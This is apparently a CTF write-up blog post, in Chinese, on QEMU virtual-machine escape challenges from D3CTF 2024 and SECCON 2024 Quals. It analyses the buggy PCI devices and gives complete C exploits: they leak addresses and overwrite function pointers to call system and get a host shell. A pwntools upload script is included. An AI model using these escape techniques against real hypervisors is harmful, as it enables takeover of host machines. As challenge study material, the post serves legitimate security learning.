---
date: 2024-02-16 10:29:56
layout: post
title: qemu 浅记
subtitle: 
description: >-
    Let's go, Tokyo!
image: >-
  /assets/img/uploads/street.jpg
optimized_image: >-
  /assets/img/uploads/street.jpg
category: ctf
tags:
  - pwn
  - qemu escape
author: rosayxy
paginate: true
---
看到初赛有一个 babyQemu 的逃逸题，遂抓紧学一波 ~     
## 交互
我们先简单想一下正常的用户态 pwn 题的交互范式，比如说是一个菜单堆题，远程运行了一个程序，它在正常状态下当然不会执行 system("/bin/sh") 函数，也不会给我们泄露堆地址、libc 地址等底层机密    
在正常的状态下，程序读入我们输入的 malloc 的 size，堆的填充内容等，来进行内存分配和释放等操作，听上去挺合理的对不对    
然而因为它具有的一些漏洞，我们可以进行一些恶意的行为，比如说故意写一个 dangling pointer 的 fd 指针之类的，从而造成异常情况，最后通过一些原语的转换（比如 IO_FILE 就是个经典的 任意地址写(任意地址写堆地址) 转化为 getshell 的原语）来执行 `system("/bin/sh\x00)`   

对于我们这里，有漏洞的程序是一个魔改过的 qemu-system-x86_64，漏洞一般是给在 pci 设备里，这个 qemu-system 在正常状态下当然不会执行 system("/bin/sh") 函数，否则就不 work 了hh ~    
在正常的堆题中，我们是发送字符串和程序交互，但是这里我们是给一个 ELF 文件到 qemu-system 里面，让 qemu-system 去执行这个 ELF 文件从而调用出问题的函数，达到交互的目的 ~      
我们最终希望的效果也是在 qemu-system 运行的时候，劫持**qemu-system 进程**的控制流，来执行 `system("/bin/sh\x00")` 之类的 getshell     

## d3babyescape - D3CTF 2024

### pmios and mmios
首先是借了煜博和 ctf-wiki 上的板子：[pmio](https://ctf-wiki.org/pwn/virtualization/qemu/exploitation/intro/)，[mmio](https://brieflyx.me/2019/linux-tools/qemu-escape-attack-surface/)    
但是原先这条语句 `iomem = mmap(0, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);` 需要把大小改为 0x1000，否则会报参数不合法   
通过 strings 找到疑似的 class_init 函数   
```c
__int64 __fastcall sub_480F2A(__int64 a1)
{
  __int64 v2; // [rsp+10h] [rbp-10h]
  __int64 v3; // [rsp+18h] [rbp-8h]

  v2 = sub_480946(a1);
  v3 = sub_48097A(a1);
  *(_QWORD *)(v3 + 176) = realize;
  *(_WORD *)(v3 + 208) = 0x1234;
  *(_WORD *)(v3 + 210) = 0x1919;
  *(_BYTE *)(v3 + 212) = 0x81;
  *(_WORD *)(v3 + 214) = 0xFF;
  *(_QWORD *)(v2 + 112) = "l0tus test PCI device";
  return sub_4808EF(7LL, v2 + 96);
}
```
然后 `lspci` 命令查看外设，通过外设找到 `00:04.0 Class 00ff: 1234:1919` 这一行，所以我们 mmap 的应该是 `"/sys/devices/pci0000:00/0000:00:04.0/resource0"`    
查看端口是 `cat /proc/ioports` 看到如下 ` c000-c0ff : 0000:00:04.0` 可知我们的 pmio 的 port 在 0xc000 ~ 0xc0ff   

### vulnerability
非常明显的越界读写，并且给了函数指针，其中 State 结构体大概是这样初始化的   

```c
void *__fastcall instance_init(const char ****a1)
{
  const char ****v1; // rax

  v1 = sub_7F810F(a1, (__int64)"l0dev", (__int64)"../qemu-7.0.0/hw/misc/l0dev.c", 0xE5u, (__int64)"l0dev_instance_init");
  v1[423] = (const char ***)&srand;   // 0xd38
  v1[424] = (const char ***)&rand;
  v1[425] = (const char ***)&rand_r; // 0xd48  
  return memset((char *)v1 + 0xC34, 0, 0x100uLL); // this is buf
}
```

- mmio_read 是对 (*(_DWORD *)(opaque + 0xA00) + addr) 的 offset 读，要求是 addr.round_down_8 + size <= 0x100   

- pmio_read 是对 addr 的 offset 读，要求是 addr.round_down_8 + size <= 0x100     

- mmio_write 检测 addr.round_down_8 + size <= 0x100 然后 addr = 0x40 时，调用 rand_r(val) ; 为 0x80时，*(_DWORD *)(opaque_1 + 0xA00) = val if val<=0x100ull 其他情况下 写 size 字节的 val 到 addr + buf    
pmio_write 在**完全没检查的情况下** 如果之前 pmio 读过一次 666 就写 val 到 (*(_DWORD *)(opaque_1 + 0xA00) + addr);否则检查 addr.round_down_8 + size <= 0x100 然后往 addr 的 buf offset 拷贝 size 个字节的 val   

然后就是覆写 "rand_r" 指针为 `system`，执行 `system("$0")` 即可完成逃逸     

### exp
```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
unsigned char* iomem;

void die(const char* msg)
{
	perror(msg);
	exit(-1);
}

void iowrite(uint64_t addr, uint64_t value)
{
	*((uint64_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr)
{
	return *((uint64_t*)(iomem + addr));
}

void iowrite32(uint64_t addr, uint32_t value)
{
	*((uint32_t*)(iomem + addr)) = value;
}

uint32_t ioread32(uint64_t addr)
{
	return *((uint32_t*)(iomem + addr));
}

void pmio_write(uint32_t val, uint32_t port)
{
    outl(val, port);
}

uint32_t pmio_read(uint32_t port)
{
    return inl(port);
}


int main(int argc, char *argv[])
{
	// Open and map I/O memory 不知道是不是 00:04.0  
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
	if (fd == -1)
		die("open");
    printf("fd: %d\n",fd);
    if (iopl(3) < 0) {
        die("failed to change i/o privilege! no root?");
    }
	iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // the size if set to 0x10000 then will be too large
	if (iomem == MAP_FAILED)
		die("mmap");

	printf("iomem @ %p\n", iomem);
    // Do something
    // leak libc
    // set opaque + 0xa00 为 0xf8 和 srand 相差 0x104
    iowrite(0x80,0xf8);
    size_t srand_leak = ioread(0xc);
    printf("srand_leak: %p\n",srand_leak);
    size_t system_address = srand_leak + 0xacd0;
    size_t binshell_address = srand_leak + 0x1925d8;
    // cover rand_r with system
    // port range c000-c0ff
    pmio_write(666,0xc000);
    // read 666 out to set the flag
    pmio_read(0xc000);
    pmio_write(system_address%0x100000000,0xc000 + 0x1c);
    pmio_write(system_address/0x100000000,0xc000 + 0x1c + 4);
    // trigger system("$0\x00") with rand_r
    iowrite(0x40,0x3024);

	return 0;
}

```

### 远程
打远程需要把我们的二进制程序传上去，这里是魔改了 [夏源姐的脚本](https://blingblingxuanxuan.github.io/2023/02/06/230206-rwctf2023-digging-into-kernel-3/#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC)

```py
from pwn import *

ch = b'/ # '	# 根据题目情况更改

# io = remote("192.168.1.207",10023)
# io.sendlineafter(b"buildroot login: ",b"root")
# io.sendlineafter(ch,b"ls")

io = remote("127.0.0.1",5555)

def upload(lname, rname):
    print("[*] uploading %s ..." % lname)
    payload = b64e(open(lname,'rb').read())
    a = len(payload) // 500
    for i in range(a + 1):
        print("[+] %d/%d" % (i,a))
        s = 'echo "' + payload[i*(500):(i+1)*500] + '" >> %s.b64' % rname
        io.sendlineafter(ch,s.encode('utf-8'))
    cmd = 'cat %s.b64 | base64 -d > %s' % (rname,rname)
    io.sendlineafter(ch,cmd.encode('utf-8'))

context.log_level = 'debug'
io.sendline("ls")    
upload("./exp","/tmp/test")
io.sendlineafter(ch,b"chmod +x /tmp/test")
io.sendlineafter(ch,b"/tmp/test")
io.interactive()

```

## babyQemu - SECCON 2024 Quals
发现和一些 kernel 题的思路类似，还是需要打堆上函数指针...   
### 思路
给了堆上任意地址读写（可以从 heap buffer 往前往后任意 oob 读写）     
所以可以很容易的 leak proc，libc，和heap    
然后就有一个任意地址读写，我一开始的想法是 leak environ，然后覆盖返回地址为 `pop rdi,ret;binshell address; system` ，但是很难保证连续覆盖的过程中，在上层函数调用时不会破坏已写入值     
看到源代码中有这个函数    
```c
static void pci_babydev_realize(PCIDevice *pci_dev, Error **errp) {
	PCIBabyDevState *ms = PCI_BABY_DEV(pci_dev);
	uint8_t *pci_conf;

	debug_printf("called\n");
	pci_conf = pci_dev->config;
	pci_conf[PCI_INTERRUPT_PIN] = 0;

	ms->reg_mmio = g_malloc(sizeof(struct PCIBabyDevReg));

	memory_region_init_io(&ms->mmio, OBJECT(ms), &pci_babydev_mmio_ops, ms, TYPE_PCI_BABY_DEV"-mmio", sizeof(struct PCIBabyDevReg));
	pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY | PCI_BASE_ADDRESS_MEM_TYPE_64, &ms->mmio);
}
```
这个 pci_babydev_mmio_ops 是有我们的 mmio_read，mmio_write 函数指针，然后挂了一个 gdb，用 search 命令可以看到我们的 opaque 里面有一个字段是位于 proc data.rel.ro 段（不可写）的这个结构体，所以我们猜测调到这些 mmio_read 和 mmio_write 都是通过 找 opaque -> 找 opaque 里面的 pci_babydev_mmio_ops 结构体 -> 找 pci_babydev_mmio_ops 的 read/write 函数   

通过我们对很多操作系统的设计的理解（比如 Windows drivers 是咋找 ioctl handlers 这种），可以知道这是相当合理的    

于是就伪造一个结构体，把 mmio_ops->read 覆盖为 system 函数，然后把 opaque 里面的指针指向它，再把 opaque 的 0x0 的 地方覆盖为 "/bin/sh" 字符串，调用 mmio_read 即可 trigger getshell     

### exp
```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
unsigned char* iomem;

void die(const char* msg)
{
	perror(msg);
	exit(-1);
}
uint64_t ioread(uint64_t addr)
{
	return *((uint64_t*)(iomem + addr));
}
void iowrite(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(iomem + addr)) = value;
}

void iowrite32(uint64_t addr, uint32_t value)
{
	*((uint32_t*)(iomem + addr)) = value;
}

uint32_t ioread32(uint64_t addr)
{
	return *((uint32_t*)(iomem + addr));
}

void iowrite64(uint64_t offset, uint64_t value)
{
    iowrite32(0, offset);
    iowrite32(8, value & 0xffffffff);
    iowrite32(0, offset + 4);
    iowrite32(8, value >> 32);
}

void iowrite64_1(uint64_t offset, uint64_t value)
{
    iowrite(0, offset);
    iowrite32(8, value & 0xffffffff);
    iowrite(0, offset + 4);
    iowrite32(8, value >> 32);
}
void iowrite32_wrapper(uint64_t addr, uint32_t value)
{
    iowrite32(0,addr);
    iowrite32(8,value);
}
int main(){
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
	if (fd == -1)
		die("open");
    printf("fd: %d\n",fd);
    if (iopl(3) < 0) {
        die("failed to change i/o privilege! no root?");
    }
	iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // the size if set to 0x10000 then will be too large
    if (iomem == MAP_FAILED)
		die("mmap");

	printf("iomem @ %p\n", iomem);
    // test 是堆内存，所以有堆上 oob read/write 0x7ffff7333000 ~ 0x7ffff7538000 为 libc; IO_list_all: 0x7ffff75374c0; system: 0x7ffff738b750
    //  proc:  0x555555554000 ~ 0x555556f4f000
    // 0x118 处有堆地址 0x1020 + 0x200 + 0x50 的地方有一个 libc 地址
    iowrite32(0,0x118);
    size_t heap_leak = ioread32(8);
    iowrite32(0,0x118+4);
    size_t heap_leak_upper = ioread32(8);
    heap_leak = heap_leak | (heap_leak_upper << 32);

    printf("heap_leak: %p\n",heap_leak); // right
    iowrite32(0,0x1020 + 0x200 + 0x50);
    size_t libc_leak = ioread32(8);
    iowrite32(0,0x1020 + 0x200 + 0x50 + 4);
    size_t libc_leak_upper = ioread32(8);
    libc_leak = libc_leak | (libc_leak_upper << 32);
    printf("libc_leak: %p\n",libc_leak); // 0x7ffff7536b00

    iowrite32(0,0x130);
    size_t proc_leak = ioread32(8);
    iowrite32(0,0x130+4);
    size_t proc_leak_upper = ioread32(8);
    proc_leak = proc_leak | (proc_leak_upper << 32);
    printf("proc_leak: %p\n",proc_leak); // 0x555555554000
    size_t proc_base = proc_leak - 0x7b44a0;
    
    size_t mmio_write = proc_base + 0x3ae1b0;
    size_t mmio_read = proc_base + 0x3ae170;
    // print all three of them
    printf("proc_base: %p\n",proc_base);
    printf("mmio_write: %p\n",mmio_write);
    printf("mmio_read: %p\n",mmio_read);

    unsigned long long libc_base = libc_leak - 0x203b00;
    printf("libc_base : %p\n",libc_base);
    size_t system = libc_base + 0x58750;
    size_t heap_buffer_addr = heap_leak + 0x1cd8;
    printf("heap buffer address: %p\n",heap_buffer_addr);
    size_t opaque_addr = heap_buffer_addr - 0xbf8;
    size_t mmio_ops_addr = opaque_addr + 0xb30;

    // assemble fake struct
    iowrite64(0,system);
    iowrite64(8,mmio_write);
    iowrite32_wrapper(0x20,2);
    iowrite32_wrapper(0x40,1);
    iowrite32_wrapper(0x44,8);
    printf("assembled fake struct\n");

    // cover the mmio_ops to our fake struct
    iowrite64_1((unsigned long long)(-0xc8),heap_buffer_addr);
    iowrite64_1((unsigned long long)-0xbf8,0x68732f6e69622f);
    // trigger
    ioread32(0);
    return 0;
}
```